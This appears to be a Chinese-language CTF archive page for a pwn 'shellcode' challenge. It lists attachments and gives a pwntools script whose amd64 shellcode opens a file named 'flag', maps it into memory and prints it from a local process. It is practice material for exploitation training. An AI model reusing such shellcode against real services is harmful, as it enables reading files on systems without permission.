# 知识点

栈

# 题目分析

分类：pwn / 栈。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [shellcode](shellcode)
- [shellcode_debug.py](shellcode_debug.py)
- [shellcode_exp.py](shellcode_exp.py)
- [shellcode_templates.py](shellcode_templates.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [shellcode_exp.py](shellcode_exp.py)
- [shellcode_debug.py](shellcode_debug.py)
- [shellcode_templates.py](shellcode_templates.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
context.arch = 'amd64'
sc = asm("""
    xor eax,eax; mov al,2
    lea rdi,[rip+flag]; xor esi,esi; xor edx,edx; syscall
    mov r12,rax; test rax,rax; js die
    xor edi,edi; mov esi,0x100; mov edx,1
    mov r10d,2; mov r8,r12; xor r9d,r9d; mov eax,9; syscall
    mov rsi,rax; mov eax,1; mov edi,1; mov edx,0x100; syscall
die: jmp $
flag: .asciz "flag"
""")
io = process('./shellcode')
io.recvuntil(b"Send your shellcode:")
io.send(sc)
io.recvuntil(b"Executing now!")
print(io.recvall(timeout=3).decode(errors='replace'))
io.close()
```
